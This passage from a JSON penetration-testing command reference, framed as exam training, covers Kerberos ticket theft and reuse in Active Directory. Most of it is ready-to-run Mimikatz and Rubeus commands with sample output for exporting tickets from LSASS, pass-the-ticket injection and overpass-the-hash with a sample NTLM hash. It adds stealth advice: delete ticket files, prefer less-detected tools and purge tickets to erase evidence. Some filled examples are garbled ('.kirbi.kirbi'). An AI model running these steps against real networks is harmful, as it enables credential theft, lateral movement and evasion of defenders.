Example:\n[0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n- Server:\nspecific service/host\n- Purpose:\nAccess specific service on specific server\n- Service-specific:\nOnly works for that service/host combination\n\nFrom training, user2's CIFS ticket for webserver was the target:\n```\n[0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n```\n\nThis ticket grants file share access (CIFS) to webserver as user2.\n\nMULTIPLE SESSIONS EXPORTED:\nMimikatz exports tickets from ALL logon sessions on the system:\n- Interactive logins (users at keyboard)\n- RDP sessions\n- Service accounts\n- Network authentications\n- RunAs sessions\n\nTypical export yields:\n- Dozens to hundreds of .kirbi files\n- Tickets from multiple users\n- Mix of TGT and TGS tickets\n- Current and expired tickets\n\nFINDING VALUABLE TICKETS:\nFrom training, after export:\n```powershell\nPS C:\\Tools> dir *.kirbi\n```\n\nLook for:\n- High-privilege users (domain admins, server admins)\n- TGT tickets (most flexible)\n- Service tickets to target systems\n- Tickets with future End Time (not expired)\n\nFROM TRAINING:\nIdentified user2's ticket by:\n1.\n\nLooking for username (user2)\n2.\n\nLooking for target service/host (cifs-webserver)\n3.\n\nChecking it's user2's ticket for webserver access\n\nPRIVILEGE REQUIREMENTS:\nExport requires:\n- Administrator privileges on current system\n- privilege::debug enabled (SeDebugPrivilege)\n- Access to LSASS process\n\nFrom training:\nuser1 was local admin on WORKSTATION02, enabling ticket export.\n\nNO ADMIN REQUIRED ON TARGET:\nImportant:\nAdmin needed on SOURCE (export machine), NOT target.\n- Export:\nAdmin on WORKSTATION02 (current machine)\n- Inject:\nNo admin needed (current user session)\n- Use:\nDepends on ticket permissions\n\nKIRBI FILE PORTABILITY:\nOnce exported:\n- .kirbi files are portable\n- Can be copied to USB/network\n- Can be moved to different machines\n- Can be injected into any Windows session\n- Cross-machine lateral movement enabled\n\nEXPORT OUTPUT EXAMPLES:\nFrom training, Mimikatz shows:\n```\n * Saved to file [0;3e7]-2-0-40e10000-user2@krbtgt-CORP.COM.kirbi\n * Saved to file [0;3e7]-2-1-40e10000-user2@ldap-DC1.CORP.COM.kirbi\n * Saved to file [0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n```\n\nEach line indicates successful ticket export.\n\nLOGON SESSION IDS (LUID):\n- [0;3e7]:\nSystem session (LUID 0x3e7 = 999 decimal)\n- [0;12bd0]:\nUser session (user2's interactive login)\n- Different LUIDs = different logon sessions\n- Same user can have multiple LUIDs (multiple sessions)\n\nTIME LIMIT ON TICKETS:\nExported tickets retain original expiration:\n- TGT:\nTypically 10 hours from issue\n- TGS:\nTypically 10 hours from issue\n- Check End Time after export\n- Expired tickets = useless\n\nVerify ticket validity:\n```powershell\nmimikatz # kerberos::list /export\n```\nShows expiration before export.\n\nMANUAL ALTERNATIVE:\nNo Windows-native tool exports tickets:\n- Mimikatz required for export\n- Rubeus alternative:\nRubeus.exe dump\n- klist shows tickets but cannot export\n\nRubeus export:\n```\nRubeus.exe dump /service:krbtgt /nowrap\n```\nOutputs base64, not .kirbi files.\n\nSECURITY IMPLICATIONS:\n- Ticket theft doesn't trigger password change notifications\n- Legitimate ticket usage - hard to detect\n- No failed authentication logs\n- Stealthier than password attacks\n\nTIME ESTIMATE:\n- Export execution:\n5-10 seconds\n- File review/identification:\n1-2 minutes\n- Total:\n2-3 minutes\n\nEXAM STRATEGY:\n1.\n\nGain admin on compromised system\n2.\n\nExport ALL tickets immediately (sekurlsa::tickets /export)\n3.\n\nIdentify high-value tickets (domain admins, service accounts)\n4.\n\nIdentify tickets to target systems\n5.\n\nInject relevant tickets for lateral movement\n6.\n\nStore .kirbi files for later use\n\nCOMMON FAILURES:\nprivilege::debug FAILED:\n- Not running mimikatz as Administrator\n- Right-click mimikatz.exe \u2192 Run as administrator\n\nNo tickets exported:\n- No active Kerberos sessions on system\n- Wait for users to login\n- Or trigger authentication (runas, net use, etc.)\n\nERROR kuhl_m_sekurlsa_acquireLSA:\n- LSASS Protected Process Light (PPL) enabled\n- Advanced protection - may need bypass\n- Try different system\n\nFORENSIC ARTIFACTS:\n- Mimikatz execution traces\n- LSASS process access (Event ID 10, Sysmon)\n- .kirbi files on disk (unless deleted)\n- File creation timestamps\n- Process creation (Event ID 4688)\n\nOPSEC CONSIDERATIONS:\n- Delete .kirbi files after injection\n- Use memory-only methods when possible\n- Mimikatz leaves traces in memory scanners\n- Consider Rubeus as less-detected alternative",
      "methodology_guidance": {
        "after_success": "passticket-mimikatz-inject  # Inject exported .kirbi ticket into current session smb-list-shares  # Test access using injected ticket kerberos-klist-verify  # Verify ticket injected successfully"
      }
    },
    {
      "id": "passticket-mimikatz-inject",
      "name": "Pass-the-Ticket - Inject Ticket (Mimikatz)",
      "description": "Inject exported .kirbi Kerberos ticket into current session for impersonation",
      "command": "mimikatz # kerberos::ptt <TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi file to inject",
          "example": "[0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-rubeus-ptt",
        "rubeus-ptt"
      ],
      "next_steps": [],
      "flag_explanations": {
        "kerberos::ptt": "Pass-the-ticket module",
        "<FILE>.kirbi": "Ticket file to inject (full path or relative)"
      },
      "success_indicators": [
        "* File: '<FILE>.kirbi': OK",
        "Ticket successfully imported",
        "klist shows new ticket"
      ],
      "failure_indicators": [
        "ERROR kull_m_file_readData",
        "File not found",
        "Ticket import failed"
      ],
      "troubleshooting": {
        "File not found": "Use full path or ensure in current directory: dir *.kirbi",
        "Ticket import failed": ".kirbi file may be corrupted - re-export",
        "Access still denied after import": "Ticket may be expired - check with klist",
        "Wrong service": "Ensure ticket matches target service (cifs for file shares, http for web, etc.)"
      },
      "notes": "REFERENCE MATERIAL - PASS-THE-TICKET INJECT WITH MIMIKATZ:\nTRAINING EXAMPLE (FROM REFERENCE DOCUMENTATION):\nContinuing from Pass-the-Ticket export scenario:\nScenario:\nuser1 (lacking access) injects user2's ticket (has access) to reach \\\\webserver\\backup.\n\nFrom WORKSTATION02 as user1, after exporting tickets:\n```\nmimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n\n* File:\n'[0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi':\nOK\n```\n\nSuccess message confirms injection.\n\nVerify injection:\n```powershell\nPS C:\\Tools> klist\n\nCached Tickets:\n(1)\n\n#0>     Client:\nuser2 @ CORP.COM\n        Server:\ncifs/webserver @ CORP.COM\n        KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n```\n\nTicket now cached as user1, but grants user2's access.\n\nTest access:\n```powershell\nPS C:\\Tools> ls \\\\webserver\\backup\n\n    Directory:\n\\\\webserver\\backup\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        5/16/2022   1:11 PM          11541 backup.txt\n```\n\nSuccess! user1 accessed \\\\webserver\\backup using user2's stolen ticket.\n\nWHAT IS PASS-THE-TICKET INJECTION:\nTaking exported Kerberos ticket (.kirbi file) and loading it into current Windows session's ticket cache, enabling authentication as the ticket owner without their password or hash.\n\nCRITICAL UNDERSTANDING:\nAfter injection:\n- whoami:\nStill shows user1 (process identity)\n- klist:\nShows user2's ticket (authentication identity)\n- Network access:\nAuthenticates as user2 (ticket owner)\n- File operations to \\\\webserver\\backup:\nSucceed as user2\n\nIdentity split:\n- Local identity:\nuser1 (process token)\n- Network identity:\nuser2 (Kerberos ticket)\n\nTRAINING SCENARIO BREAKDOWN:\nBefore injection:\n- user1 attempts:\nls \\\\webserver\\backup\n- Result:\nAccess denied (jen lacks permissions)\n\nAfter injection:\n- user1 attempts:\nls \\\\webserver\\backup (same command)\n- Result:\nSuccess (user2's ticket used for authentication)\n\nNo password needed, no hash needed - just stolen ticket.\n\nHOW TICKET INJECTION WORKS:\n1.\n\nMimikatz kerberos::ptt reads .kirbi file\n2.\n\nParses Kerberos ticket structure\n3.\n\nInjects ticket into current session's ticket cache (via LsaCallAuthenticationPackage API)\n4.\n\nWindows Kerberos provider accepts ticket as legitimate\n5.\n\nSubsequent authentication uses injected ticket\n\nWHY THIS WORKS:\nWindows doesn't validate HOW ticket was obtained:\n- Legitimate:\nUser authenticated, KDC issued ticket\n- Stolen:\nMimikatz injected ticket from file\n- Windows treats both identically\n- No verification of ticket source\n- Ticket contains all necessary cryptographic proof\n\nNO ADMIN REQUIRED (CRITICAL ADVANTAGE):\nUnlike Pass-the-Hash:\n- Pass-the-Hash:\nRequires admin (LSASS access for injection)\n- Pass-the-Ticket (inject):\nNO admin required\n- Can inject into current user session\n- Can steal from OWN session and reuse\n\nFrom training:\nuser1 used their own tickets (as local admin) but could also use stolen tickets without admin if exporting from own session.\n\nTICKET SERVICE MATCHING:\nTicket service MUST match target:\nFrom training:\n- Ticket:\nuser2@cifs-webserver.kirbi\n- Service:\nCIFS (file shares)\n- Host:\nwebserver\n- Works for:\n\\\\webserver\\* file access\n- Does NOT work for:\n\\\\webserver HTTP, \\\\fileserver CIFS, etc.\n\nService examples:\n- cifs/hostname:\nFile share access (SMB/CIFS)\n- http/hostname:\nWeb services\n- ldap/hostname:\nDirectory services\n- host/hostname:\nGeneric host services\n- mssql/hostname:\nSQL Server\n\nTICKET TYPES FOR INJECTION:\nTGS (Service Ticket) - Like training example:\n- Specific service + host\n- Immediate use\n- Limited scope\n- Example:\nuser2@cifs-webserver.kirbi\n\nTGT (Ticket Granting Ticket) - Most valuable:\n- Can request ANY service ticket\n- Flexible\n- Example:\nuser2@krbtgt-CORP.COM.kirbi\n- After injection, can access any service as user2\n\nFrom training scenario, TGS was sufficient (only needed webserver access), but TGT would enable broader access.\n\nMIMIKATZ INJECTION COMMAND:\n```\nmimikatz # kerberos::ptt <FILENAME>.kirbi\n```\n\nAlternative syntax:\n```\nmimikatz # kerberos::ptt /ticket:<FILENAME>.kirbi\n```\n\nBoth work identically.\n\nINJECTION VERIFICATION:\nAlways verify with klist:\n```powershell\nklist\n```\n\nSuccess indicators:\n- Cached Tickets:\n(N) where N increased\n- New ticket appears in list\n- Client:\nShows ticket owner (user2)\n- Server:\nShows service (cifs/webserver)\n\nFailure indicators:\n- No new tickets\n- Error message from Mimikatz\n- File not found\n\nTESTING INJECTED TICKET:\nFrom training:\n```powershell\nls \\\\webserver\\backup\n```\n\nAttempt access to resource ticket should grant.\n\nSuccess:\n- Directory listing appears\n- No \"Access denied\" error\n- Operations complete normally\n\nFailure:\n- Access denied:\nTicket wrong service/expired/invalid\n- Network path not found:\nHostname resolution issue\n- Logon failure:\nTicket expired or invalid\n\nTICKET LIFETIME AND EXPIRATION:\nInjected tickets retain original expiration:\n- Original End Time preserved\n- No extension via injection\n- Check klist for End Time\n- Expired ticket = useless\n\nFrom training:\nTickets typically 10-hour lifetime.\n\nIf ticket expired:\n- Cannot use (KDC rejects)\n- Must obtain fresh ticket\n- Export tickets immediately after compromise\n\nCROSS-SESSION INJECTION:\nTickets can be:\n- Exported from user2's session\n- Injected into user1's session\n- Used on same machine\n- Or moved to different machine\n\nPortability:\n- .kirbi file contains full ticket\n- Platform-independent (Windows only)\n- Machine-independent\n- Network-transferable\n\nMULTIPLE TICKET INJECTION:\nCan inject multiple tickets:\n```\nmimikatz # kerberos::ptt ticket1.kirbi\nmimikatz # kerberos::ptt ticket2.kirbi\nmimikatz # kerberos::ptt ticket3.kirbi\n```\n\nEach adds to cache:\n- klist shows all injected tickets\n- Multiple users/services accessible\n- No limit on concurrent tickets\n\nFILE PATH HANDLING:\nRelative path:\n```\nmimikatz # kerberos::ptt ticket.kirbi\n```\nLooks in current directory.\n\nAbsolute path:\n```\nmimikatz # kerberos::ptt C:\\Temp\\ticket.kirbi\n```\n\nNetw ork path:\n```\nmimikatz # kerberos::ptt \\\\attacker\\share\\ticket.kirbi\n```\n\nTROUBLESHOOTING:\nFile not found:\n- Check current directory:\ndir *.kirbi\n- Use full path\n- Verify filename spelling (case-sensitive in some contexts)\n\nTicket import failed:\n- .kirbi file corrupted\n- Re-export from source\n- Try different ticket\n\nAccess still denied after injection:\n- Ticket expired:\nCheck klist End Time\n- Wrong service:\nVerify ticket service matches target\n- Wrong host:\nVerify ticket hostname matches target\n- Ticket invalid:\nRe-export fresh ticket\n\nMANUAL ALTERNATIVE:\nRubeus provides alternative:\n```\nRubeus.exe ptt /ticket:ticket.kirbi\n```\n\nSame functionality, different tool.\n\nAdvantage:\n- Rubeus less detected than Mimikatz\n- More modern codebase\n- Better OPSEC features\n\nTIME ESTIMATE:\n- Injection:\n5-10 seconds\n- Verification (klist):\n5 seconds\n- Test access:\n10-30 seconds\n- Total:\n<1 minute\n\nEXAM STRATEGY:\n1.\n\nExport tickets from compromised systems\n2.\n\nIdentify valuable tickets (high-privilege users, target services)\n3.\n\nInject relevant tickets into your session\n4.\n\nVerify with klist\n5.\n\nTest access immediately\n6.\n\nIf success, proceed with exploitation\n7.\n\nIf failure, try different ticket or troubleshoot\n\nCOMPARISON TO OTHER TECHNIQUES:\nPass-the-Hash:\n- Requires:\nNTLM hash\n- Privilege:\nAdmin (for injection)\n- Scope:\nNTLM authentication\n- Tools:\nMimikatz, Impacket\n\nOverpass-the-Hash:\n- Requires:\nNTLM hash\n- Privilege:\nAdmin (for Mimikatz)\n- Scope:\nKerberos authentication\n- Result:\nGenerates new TGT\n\nPass-the-Ticket:\n- Requires:\nExisting ticket\n- Privilege:\nNone (for injection into own session)\n- Scope:\nSpecific service or TGT\n- Result:\nReuses stolen ticket\n\nPass-the-Ticket advantages:\n- No password/hash needed\n- No admin required (for injection)\n- Stealthier (reuses legitimate ticket)\n- Works across machines\n\nFORENSIC ARTIFACTS:\n- Mimikatz execution (if used)\n- .kirbi file on disk (unless deleted)\n- Kerberos authentication events (Event ID 4769 on target)\n- No new TGT request (reuses existing)\n- Ticket appears in klist output\n\nOPSEC CONSIDERATIONS:\n- Delete .kirbi files after injection\n- Use Rubeus instead of Mimikatz (less detected)\n- Inject tickets only when needed\n- Clear tickets after use (klist purge)\n- Stolen ticket usage looks legitimate (hard to detect)",
      "methodology_guidance": {
        "after_success": "kerberos-klist-verify  # Confirm ticket injected and shows in cache smb-list-shares  # Test access using stolen ticket (e.g., dir \\\\webserver\\backup) passticket-mimikatz-export  # Export more tickets for additional targets"
      },
      "filled_example": "mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi.kirbi"
    },
    {
      "id": "passticket-rubeus-ptt",
      "name": "Pass-the-Ticket - Rubeus PTT",
      "description": "Inject .kirbi ticket using Rubeus (alternative to Mimikatz)",
      "command": "Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi ticket file",
          "example": "ticket.kirbi",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "pass-the-ticket",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-mimikatz-inject"
      ],
      "next_steps": [],
      "flag_explanations": {
        "ptt": "Pass-the-ticket action",
        "/ticket": "Path to .kirbi file"
      },
      "success_indicators": [
        "[*] Ticket successfully imported",
        "klist shows ticket"
      ],
      "failure_indicators": [
        "Error importing ticket",
        "File not found"
      ],
      "troubleshooting": {
        "File not found": "Use full path",
        "Import failed": "Ensure .kirbi format correct"
      },
      "notes": "EDUCATIONAL CONTEXT:\nRubeus provides modern alternative to Mimikatz for pass-the-ticket.\n\nWHY RUBEUS:\nMore actively maintained, better OPSEC features.\n\nTIME ESTIMATE:\n<1 minute.\n\nEXAM TIP:\nRubeus and Mimikatz both work - use whichever available.",
      "methodology_guidance": {
        "after_success": "kerberos-klist-verify  # Verify ticket injected successfully smb-list-shares  # Test access using injected ticket"
      },
      "filled_example": "Rubeus.exe ptt /ticket:ticket.kirbi.kirbi"
    },
    {
      "id": "overpass-rubeus-asktgt",
      "name": "Overpass-the-Hash - Rubeus asktgt",
      "description": "Request TGT using NTLM hash with Rubeus (alternative to Mimikatz sekurlsa::pth)",
      "command": "Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user1",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM (RC4) hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "overpass-the-hash",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-mimikatz-pth"
      ],
      "next_steps": [],
      "flag_explanations": {
        "asktgt": "Request TGT from KDC",
        "/user": "Username",
        "/domain": "Domain FQDN",
        "/rc4": "NTLM hash (RC4 encryption)",
        "/ptt": "Pass-the-ticket - auto inject TGT",
        "/aes256": "Use AES256 hash instead (if available)"
      },
      "success_indicators": [
        "[*] Got TGT",
        "[*] Ticket successfully imported",
        "klist shows TGT"
      ],
      "failure_indicators": [
        "KDC_ERR_PREAUTH_FAILED",
        "KDC_ERR_CLIENT_NOT_FOUND"
      ],
      "troubleshooting": {
        "PREAUTH_FAILED": "Invalid hash",
        "CLIENT_NOT_FOUND": "Username/domain incorrect"
      },
      "notes": "EDUCATIONAL CONTEXT:\nRubeus directly requests TGT using hash (cleaner than Mimikatz method).\n\nWHY USE THIS:\nSingle command vs Mimikatz multi-step.\n\nTIME ESTIMATE:\n<1 minute.\n\nEXAM TIP:\nRubeus asktgt more reliable than Mimikatz sekurlsa::pth.",
      "methodology_guidance": {
        "after_success": "kerberos-klist-verify  # Verify TGT received and cached psexec-sysinternals  # Use TGT for lateral movement with Kerberos"
      },
      "filled_example": "Rubeus.exe asktgt /user:user1 /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt"
    },
    {
      "id": "kerberos-purge-tickets",
      "name": "Kerberos - Purge All Tickets",
      "description": "Clear all cached Kerberos tickets from current session",
      "command": "klist purge",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "PENTEST",
        "kerberos",
        "cleanup",
        "opsec",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "purge": "Delete all Kerberos tickets from cache"
      },
      "success_indicators": [
        "Ticket cache purged successfully",
        "klist shows 0 tickets"
      ],
      "failure_indicators": [
        "Access denied"
      ],
      "troubleshooting": {
        "Access denied": "Run as administrator or purge only affects current user tickets"
      },
      "notes": "EDUCATIONAL CONTEXT:\nClean up ticket cache for OPSEC or testing.\n\nWHY USE:\nRemove evidence of ticket injection, prepare clean state.\n\nTIME ESTIMATE:\n<5 seconds.\n\nEXAM TIP:\nUse between testing different stolen tickets.",
      "methodology_guidance": {
        "after_success": "overpass-mimikatz-pth  # Re-establish fresh Kerberos tickets if needed passticket-mimikatz-inject  # Inject new tickets after clearing cache"
      }
    },
    {
      "id": "kerberos-troubleshoot-time",
      "name": "Kerberos - Troubleshoot Time Skew",
      "description": "Check time synchronization between client and DC (Kerberos requires <5 min skew)",
      "command": "net time \\\\<DC>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DC>",
          "description": "Domain controller hostname",
          "example": "DC1",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "kerberos",
        "troubleshooting",
        "time-sync",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "net time": "Display or synchronize time",
        "\\\\<DC>": "Query time from DC",
        "/set /yes": "Synchronize local time to DC"
      },
      "success_indicators": [
        "Current time at \\\\<DC> is <TIME>",
        "Time difference <5 minutes"
      ],
      "failure_indicators": [
        "System error 5 - Access denied",
        "Time difference >5 minutes"
      ],
      "troubleshooting": {
        "Access denied": "Use /set /yes to force: net time \\\\<DC> /set /yes",
        ">5 min skew": "Kerberos will fail - synchronize time before retry",
        "Cannot contact DC": "Check network connectivity and firewall"
      },
      "notes": "EDUCATIONAL CONTEXT:\nKerberos requires client and DC time within 5 minutes (default).\n\nWHY IMPORTANT:\nTime skew causes KDC_ERR_SKEW error, all Kerberos auth fails.\n\nCOMMON ISSUE:\nVMs with suspended state, isolated networks without NTP.\n\nFIX:\nnet time \\\\<DC> /set /yes synchronizes to DC time.\n\nTIME ESTIMATE:\n<10 seconds check, <30 seconds fix.\n\nEXAM TIP:\nIf Kerberos mysteriously fails, check time first - common troubleshooting step.",
      "methodology_guidance": {
        "after_success": "overpass-mimikatz-pth  # Retry overpass-the-hash after time sync passticket-mimikatz-export  # Re-export tickets after time sync resolved"
      },
      "filled_example": "net time \\\\DC1"
    }
  ]
}